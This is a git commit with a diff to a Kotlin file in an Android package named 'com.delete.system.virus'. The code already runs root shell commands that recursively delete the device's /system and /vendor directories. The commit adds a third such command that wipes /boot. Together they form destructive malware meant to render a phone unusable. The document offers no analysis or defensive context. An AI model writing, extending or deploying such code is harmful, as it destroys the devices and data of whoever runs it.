78e1da1633329ff38e9a8b7a95e7de31bf93c3d5
silvathaisfernanda16-sys <silvathaisfernanda16@gmail.com>
2025-12-31 19:53:21 -0300

    Update MainActivity.kt

--- src/com/delete/system/virus/MainActivity.kt
+++ src/com/delete/system/virus/MainActivity.kt
@@ -3,3 +3,4 @@ import android.os.*
 
 Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /system")).waitFor()
 Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /vendor")).waitFor()
+Runtime.getRuntime().exec(arrayOf("su", "-c", "rm -rf /boot")).waitFor()
